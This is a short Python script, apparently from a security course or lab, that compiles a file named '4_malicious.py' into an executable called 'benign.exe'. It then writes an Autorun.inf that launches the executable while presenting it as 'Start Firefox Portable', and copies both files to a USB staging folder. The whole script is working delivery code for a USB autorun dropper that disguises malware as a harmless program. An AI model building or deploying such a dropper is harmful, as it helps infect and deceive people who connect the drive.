import PyInstaller.__main__
import shutil
import os


filename = '4_malicious.py'
exename = 'benign.exe'
pwd = os.getcwd()
usbdir = os.path.join(pwd, 'USB')

if os.path.isfile(exename):
    os.remove(exename)

print('Creating EXE')
PyInstaller.__main__.run([
    '4_malicious.py',
    '--onefile',
    '--clean',
    '--log-level=ERROR',
    f'--name={exename}'
])
print('EXE Created')

# Cleanup
shutil.move(os.path.join(pwd, 'dist', exename), pwd)
try:
    shutil.rmtree('dist')
    shutil.rmtree('build')
    shutil.rmtree('__pycache__')
    os.remove(exename+'.spec')
except FileNotFoundError:
    pass

print('Creating Autorun file')
with open('Autorun.inf', 'w') as o:
    o.write('(Autorun)\n')
    o.write(f'Open={exename}\n')
    o.write('Action=Start Firefox Portable\n')
    o.write('Label=My USB\n')

print('Settings up USB')

# Move files to usb and set to hidden
shutil.move(exename, usbdir)
shutil.move('Autorun.inf', usbdir)
os.system(f'chmod -R 775 . {os.path.join(usbdir, "Autorun.inf")}')
